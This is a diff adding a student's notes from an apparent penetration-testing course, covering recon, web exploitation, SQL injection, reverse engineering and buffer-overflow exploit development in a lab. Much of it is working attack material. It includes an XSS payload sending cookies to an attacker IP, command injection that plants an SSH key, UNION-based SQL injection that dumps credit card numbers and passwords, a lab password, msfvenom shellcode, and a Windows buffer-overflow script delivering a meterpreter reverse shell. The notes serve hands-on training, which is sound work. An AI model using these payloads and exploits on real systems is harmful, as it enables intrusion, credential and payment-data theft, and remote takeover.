@@ -32,3 +32,465 @@ exfiltrate target data
 
 Phase 6: Document Mission¶
 Document and report mission details.
+
+####################  SCANNING AND RECON #############################
+DATA TO COLLECT
+Web Data
+Sensitive Data
+Publicly Accessible
+Social Media
+Domain and IP Data
+
+ssh demo1@10.50.15.172 -L1112:10.208.50.42:80
+
+##Control sockets
+ssh -MS /tmp/jump student@10.50.12.19 M- means multiplexing. S- means the socket.
+
+PING SWEEP only on jump box:   for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+
+##################################### EXPLOIT RESEARCH ######################################################
+exploit-db is what will be using to research .
+Is to understand how to conduct vulnerability and exploit pairing/research based on collected technical information. 
+
+##################################### WEB EXPLOITATION UPLOAD ##################################################
+HTTP
+  ##tools to use tpdump, wireshark   https://tools.ietf.org/html/rfc2616 
+  ## only focusing on GET & POST
+
+HTTP method 
+GET request can be utilized to pass data to the server using the URL string:
+  http://10.50.x.x/path
+
+CROSS-SITE SCRIPTING (XSS)
+  -Insertion of arbitrary code into a webpage, that executes in the browser of visitors
+  -Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
+
+REFLECTED XSS
+-Most common form of XSS
+Transient, occurs in error messages or search results
+Delivered through intermediate media, such as a link in an email
+Characters that are normally illegal in URLs can be Base64 encoded
+
+STORED XSS
+Resides on vulnerable site
+Only requires user to visit page
+
+script to post info
+<script>document.location="http://10.50.153.198:XXXX/?username=" + document.cookie;</script>
+Capturing Keystrokes
+bind keydown and keyup
+Capturing Sensitive Data add this to the script    ##document.body.innerHTML
+
+find /path/to/directory -type f -perm -o=r ## find any files that is readable
+
+COMMAND INJECTION
+##Application on the server is vulnerable, allowing execution of arbitrary commands
+User input not validated
+  Common example is a SOHO router, with a web page to allow ping
+Might contain the following in it’s code:
+  system("ping -c 1 ".$_GET["ip"]);
+Run the following to chain/stack our arbitrary command
+  ; cat /etc/passwd
+
+ssh-keygen -t rsa -b 4096
+upload, navigate to the upload, be able to call or execute that thing
+
+malicious upload
+  run whoami to see who the user is.
+  check for .ssh by using ; ls -la /home/billybob
+  create .ssh directory by using mkdir to user home folder /home/billybob/.ssh 
+  create a rsa key ssh-keygen -t rsa -b 4096
+  to check the key cat ~/.ssh/id_rsa.pub
+  echo the public key in to new file  syntax: ; echo"pubkey" >> /home/billybob/.ssh/authorized_keys
+ check it - ; cat /var/www/.ssh/authorized_keys
+ 
+  ################################# WEB EXPLOITATION SQL ############################################
+SQL - Structured Query Language - ANSI Standard                                         UNION AND SELECT COMMANDS WE WILL FOCUS ON.
+SELECT- Extracts data from a database
+UNION -Used to combine the result-set of two or more SELECT statements
+USE -Selects the DB to use
+UPDATE- Updates data in a database
+DELETE -Deletes data from a database
+INSERT INTO -Inserts new data into a database
+CREATE DATABASE -Creates a new database
+ALTER DATABASE -Modifies a database
+CREATE TABLE -Creates a new table
+ALTER TABLE -Modifies a table
+DROP TABLE -Deletes a table
+CREATE INDEX -Creates an index (search key)
+DROP INDEX -Deletes an index
+
+authentication bypass 
+input this in user and password column 'OR 1='1  and click login this is a (POST REQUEST)
+payload of the post request in the developer console and click on the network tab and login to see the post request. 
+in the developer console click request to cature that payload of that data and then hit the toggle to turn on "raw" url padden version of that payload copy and paste (THIS IS A GET REQUEST) and put a ? mark before url and click ENTER
+
+
+
+standard sql injection 
+
+
+
+sQL INJECTION CONSIDERATION
+-Requires Valid SQL Queries
+-Fully patched systems can be vulnerable due to misconfiguration
+-Input Field Sanitization
+-String vs Integer Values #will add the $ or that bullet 
+-information_schema
+-GET Request versus POST Request HTTP methods
+
+
+UNSANITIZED FIELD
+  input fields can be found using a Single Quote ⇒ '
+    Will return extraneous information
+    ' closes a variable, to allow for additional statements/clauses
+    May show no errors or generic error (harder Injection)
+
+SANITIZED
+  input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
+
+
+SERVER-SIDE QUERY PROCESSING 
+  The Server-Side Query that would be passed to MySQL from PHP would be:
+  BEFORE INPUT: SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
+  AFTER INPUT:  SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
+
+
+EXAMPLE -INJECTING YOUR STATEMENT
+  User enters tom' OR 1='1 in the name and pass fields.
+    ##Truth Statement: tom ' OR 1='1
+      Server-Side query executed would appear like this: SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+
+
+STACKING STATEMENTS
+  Chaining multiple statements together using a semi-colon ;
+  SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; -- '
+
+
+  
+
+DEMO WALK THROUGH 
+mysql -drop you in the sql server
+
+##GOLDEN STATEMENT
+product=7 select table_schema, table_name, column_name from information_schema.columns #
+   <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> FROM <NAME OF DATABASE>.<NAME OF TABLE>
+, names of column 
+name of the database (.)name of the table 
+
+database
+  table
+    column
+
+information_schema ##name of database                custom database aka "session" == flags 
+  columns          ##name of table
+    table-schema    ## name of columns
+    table_name       ## name of columns
+    column_name      ## name of columns
+
+
+COMMANDS FOR DATABASE
+  >use infomation_schema
+  >show tables ;
+  >show columns from columns
+  >select table_schema, table_name, column_name from information_schema.columns
+
+##default database
+information_schema
+performance_schema
+mysql
+information schema you will need to query 
+
+## QUERY
+select tireid,name,size from session.tires ;    #case sensitive 
+
+standard sql injection                          Example
+1. IDENTIFY VULNERABLE FIELD/SELECTION      fORD' OR 1='1  #VULNERABILITY ALWAYS GIVE MORE INFORMATION
+2. IDENTIFY # OF COLUMNS/SELECTIONS         Audi' UNion SELECT 1,2,3,4 #                   #####HASHTAG A PART OF THE SYNTAX########
+3. MODIFY GOLDEN STATEMENT                  Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #  
+4. CRAFT QUERIES                            Audi' UNION SELECT tireid,2,name,size,cost from session.tires #  
+                                            Audi' UNION SELECT tireid,name,size,cost from session.tires #
+
+GET METHOD 
+1. IDENTIFY VULNERABLE FIELD/SELECTION      SELECTION=1 OR 1=1
+2. identify number of columns                SELECTION=1 UNION SELECT 1,2,3
+3 MODIFY THE GOLDEN RULE                      SELECTION=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+4 CRAFT QUERY                                  SELECTION=2 UNION SELECT start,status,last_access from session.session_log
+                                                SELECTION=2 UNION SELECT id,name,pass from session.user
+
+Nesting statements
+## Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+  UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+
+ignore the rest
+  Using # or -- tells the Database to ignore everything after
+  Input to Inject: 1 or 1=1; #   #-part of the syntax
+
+
+Blind injection for validation:
+  php?item=4 OR 1=1
+  Try ALL combinations! item=1, item=2, item=3, etc.
+
+Abuse The Client (GET METHOD)
+Passing injection through the URL:
+After the .php?item=4 pass your UNION statement
+prices.php?item=4 UNION SELECT 1,2
+prices.php?item=4 UNION SELECT 1,2,@@version
+
+Abuse The Client (Enum)
+  php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+
+
+
+ctf 
+http://127.0.0.1:10090/cases/productsCategory.php?category=13%20UNION%20SELECT%20table_schema,%20table_name,%20column_name%20from%20information_schema.columns
+Boss	R1x9TEeAJsxYwZsIUB3x
+Products=1 UNION SELECT 1,2,@@VERSION
+
+127.0.0.1:10090/cases/productsCategory.php?category=1 UNION SELECT id,creditcard_number, from sqlinjection.payments
+union select creditcard_number,date,order from sqlinjection.payments
+
+NSERT INTO members (first_name, last_name, username, password, email, permission)
+VALUES ('Hacker', 'Hacker', ''OR 1='1', '''OR 1=''1', 'Hacker@gmail.com', 3) 
+
+1 or 1=1; # 
+
+########################### REVERSE ENGINEERING ################################################
+Reverse enginering-
+STACK
+  -Use the lifo(last in first out methodlogy)
+  A section of memory reserved for temporary data storage, managed by the system to support program execution
+
+X86_64 ASSEMBLY - COMMON TERMS
+  Heap -Memory that can be allocated and deallocated
+  Stack -A contiguous section of memory used for passing arguments
+  General Register -A multipurpose register that can be used by either programmer or user to store data or a memory location address
+  Control Register -A processor register that changes or controls the behavior of a CPU
+  Flags Register -Contains the current state of the processor
+
+X86_64 ASSEMBLY DATA SIZES
+  Bit -Smallest unit in computing - 0 or 1
+  Nibble  -4 bits/half an octet
+  Byte -8 bits
+  Word -16 bits
+  DWord -32 bits - common
+  QWord -64 bits - common
+
+X86_64 ASSEMBLY REGISTERS
+  There are 16 general purpose 64-Bit registers
+  %rax -the first return register
+  %rbp -the base pointer that keeps track of the base of the stack
+  %rsp -the stack pointer that points to the top of the stack
+
+X86_64 ASSEMBLY -MEMORY OFFSET
+  There is one instruction pointer register that points to the memory offset of the next instruction in the code segment:
+  64-Bit	Lower-32bits	Lower-16bits	Descrition
+  RIP        EIP            IP         Instruction Pointer; holds address for next instruction to be executed
+
+
+X86_64 ASSEMBLY - COMMON INSTRUCTION POINTERS
+  MOV -move source to destination
+  PUSH -push source onto stack
+  POP -Pop top of stack to destination
+  INC -Increment source by 1
+  DEC -Decrement source by 1
+  ADD -Add source to destination
+  SUB -Subtract source from destination
+  CMP -Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
+  JMP -Jump to specified location
+  JLE -Jump if less than or equal
+  JE -Jump if equal
+
+
+X86_64 ASSEMBLY -FLAGS REGISTER
+    Flags Register - This register holds the current state of the processor, reflecting the outcomes of various operations and influencing subsequent instructions.
+    CF - Carry Flag -Generates a carry or borrow
+    ZF - Zero Flag -Set by most instructions if the result of an operation is binary zero
+    SF - Sign Flag -Set this bit the same as the most significant bit of the result. 0 = positive, 1 = negative
+    OF - Overflow Flag -Set if the result was too large to fit in the designation.
+
+
+PORTABLE EXECUTEABLE PATCHING/SOFTWARE ANALYSIS
+  Perform Debugging and Disassembly
+  Find the Success/Failure
+  Adjust Instructions
+  Apply Patch and Save
+  Execute Patched Binary
+
+DEMO 
+        C++ basics 
+atoi  -ascii to integer
+fget -file get stream- receive the input 
+strtok -is used for tokenizing a C-style string based on a set of delimiters
+
+
+1) run the string.exe against the malware  static. another command to run is TYPE to find the type of file. dont really cat binary.
+2) run the malwar in a safe environment
+3) open in ghidra
+4) search for strings in ghidra
+5)after you find the string click twice
+6) 
+
+                        TO PATCH 
+right click press patch instruction cmp to eax to eax   be mindful of which directory it saving to.
+
+################################# EXPLOIT DEVELOPMENT #####################################################
+BUFFER OVERFLOW COMMON TERMS
+
+Heap- Memory that can be allocated and deallocated
+Stack -A contiguous section of memory used for passing arguments
+Registers -Storage elements as close as possible to the central processing unit (CPU)
+Instruction Pointer (IP) -a.k.a Program Counter (PC), contains the address of next instruction to be executed
+Stack Pointer (SP) -Contains the address of the next available space on the stack
+Base Pointer (BP) -The base of the stack
+Function -Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
+Shellcode -The code that is executed once an exploit successfully takes advantage of a vulnerability
+
+NOP SLED - a NOP sled (or "no-operation" sled") is a sequence of "no-operation" (NOP) machine instructions.
+
+                                                                                                                                                                                    TM ON WINDOWS MONA, IMMUNITY
+GDB USES
+* installations of peda plugin
+  git clone https://github.com/longld/peda.git ~/peda
+  echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+DEMO on func.exe
+strings func1 | head 
+file func  -to see the file type.
+DYNAMIC ANALYSIS  RUN in lINUX OPS STATION.
+  ./func $(echo "12345678") #pass argument
+  ./func <<<$(echo "12345678") #the gators are simulating  user input
+
+## DISASSEMBLY
+gdb ./func command
+shell - bring you back to your shell or working directory.
+exit - bring you back to gdb from shell
+quit - break you out of gdb
+
+IN GDB                                ##DON'T HIDE ANYTHING IN X86
+  info functions
+  run - to run the program 
+  disass or pdisass main #pdisass only work if you have peta
+      disass main
+  pdisass getuserinput #getuserinput is a function    #open source research on red. do open source research oom it.
+run <<<$(echo "AAA")
+run <<<$(python linbuff.py)
+google wiremask  https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+copy paste paterrn - paste it in a new offset in your code with quotes. 
+run it in gdb now you looking for EIP, copy eip in the offset on the website, you should get a number.
+
+PYTHON  SCRIPT
+#!/usr/bin/env python
+offset = "A" * 100    adjust the the ofset to 62   #triple single quotes help write paragraph. create multi-line strings.
+print(offset)
+eip = "BBBB"
+offset = " paste from wiremask offset"                  TROUBLESHOOT ##RUN FILE AND THE EXECUTABLE 
+print(offset+eip)
+eip = "\x59\x3b\xde\xf7" switch this with the "BBBB"
+nop = "\x90" * 15
+
+
+
+#####setup GDB environment and find jmp esp addresses
+
+#follow the exaact orer below 
+>SHELl    this is done for every machine you are on.
+env - gdb ./func                                                                                    scp -r /home/student/Downloads/* student@10.50.153.200:C:/Users/student/ 
+#Show env 
+#unset env COLUMNS
+#unset env LINES 
+#run and ctrl+c or start
+info proc map
+
+### grab first address after heap, last address before 
+0xf7de1000 0xf7ffe000   first address after heap and last address before stack
+#find  /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4 
+0xf7de3b59 > \x59\x3b\xde\xf7 (little indian)
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+#put the little indian in the python code eip section.
+
+#SHELL
+######msfvenom - p linux/x86/exec CMD="whoami" -b "\x00\xfe\x20\x0a\xff" -f python  
+ buf =  b""
+buf += b"\xbb\x7e\x25\x4c\xd7\xdb\xca\xd9\x74\x24\xf4\x5a"
+buf += b"\x2b\xc9\xb1\x0b\x31\x5a\x14\x03\x5a\x14\x83\xea"
+buf += b"\xfc\x9c\xd0\x26\xdc\x38\x82\xe5\x84\xd0\x99\x6a"
+buf += b"\xc0\xc7\x8a\x43\xa1\x6f\x4b\xf4\x6a\x0d\x22\x6a"
+buf += b"\xfc\x32\xe6\x9a\xf9\xb4\x07\x5b\x71\xdc\x68\x3a"
+buf += b"\x10\x75\x77\xeb\xb9\x0c\x96\xde\xbe"
+
+
+##### WINDOWS BUFFER OVERFLOW 
+
+#Static
+strings .\vulnserver.exe | select -first 10
+
+##Behavioral
+get-process | findstr /i vuln 
+netstat -anop tcp | findstr /i 8148  
+
+##run as intended
+
+#Dyamic 
+Run Immunity as Administrator > open .exe > play, rewind, repeat
+fuzzing > wireshark > find offset
+
+!mona modules #Find unprotected DLLS
+!mona jmp -r esp -m "essfunc.dll"   #Search for JMP ESP with unprotected DLL
+#Window > Log Data 
+625011AF    \xAF\x11\x50\x62 
+625011BB
+625011C7
+
+#MSF CONSOLE
+msfconsole
+
+use multi/handler
+show options 
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0 
+set LPORT 4444
+exploit
+
+#Shell Code
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.153.198 lport=44444 -b "\x00\xfe\x20\x0a\xff" -f python
+
+
+WINDOWS PYTHON SCRIPT
+!/usr/bin/python
+import socket
+
+### FUZZ ###
+buf = "TRUN /.:/"
+buf += "A" * 2003 # offset
+#buf += "BBBB" # EIP                      #line commented out 
+buf += "\xAF\x11\x50\x62" # EIP
+buf += "\x90" * 10 # NOP
+buf += b"\xda\xc7\xd9\x74\x24\xf4\x5f\xb8\x94\x42\x15\x86"
+buf += b"\x29\xc9\xb1\x59\x31\x47\x19\x83\xef\xfc\x03\x47"
+buf += b"\x15\x76\xb7\xe9\x6e\xf9\x38\x12\x6f\x65\x08\xc0"
+buf += b"\xe6\x80\x0e\x6f\xaa\x7a\x44\x3d\x47\xf1\x08\xd6"
+buf += b"\x66\xfa\x26\xa4\xa0\x0b\x8e\x03\x97\x22\x30\x3f"
+buf += b"\xeb\x25\xcc\x42\x38\x85\xed\x8c\x4d\xc4\x2a\x5b"
+buf += b"\x3b\x29\xe6\xd7\x91\xa5\x8c\xaa\x29\xc4\x42\xa1"
+buf += b"\x12\xbe\x35\x33\x52\x4a\xf6\x3a\x83\x39\x5e\x1d"
+buf += b"\xa8\x75\x47\x5c\x7d\xd5\xf2\x97\xf5\xe9\xcd\xd8"
+buf += b"\xbf\x9a\x1a\xac\x41\x4a\x53\x72\xed\xb3\x5b\x7f"
+buf += b"\xef\xf4\x5c\x60\x9a\x0e\x9f\x1d\x9d\xd5\xdd\xf9"
+buf += b"\x28\xc9\x46\x89\x8b\x2d\x76\x5e\x4d\xa6\x74\x2b"
+
+### SHELLCODE ###
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the Ipv4 socket, TCP protocol
+s.connect(("10.50.153.200", 9999)) #connect to target IP and port
+print s.recv(1024) #print response
+s.send(buf) #send the value of buf
+
+####################################### POST EXPLOITATION #################################################################3
+
+
+
+                                               
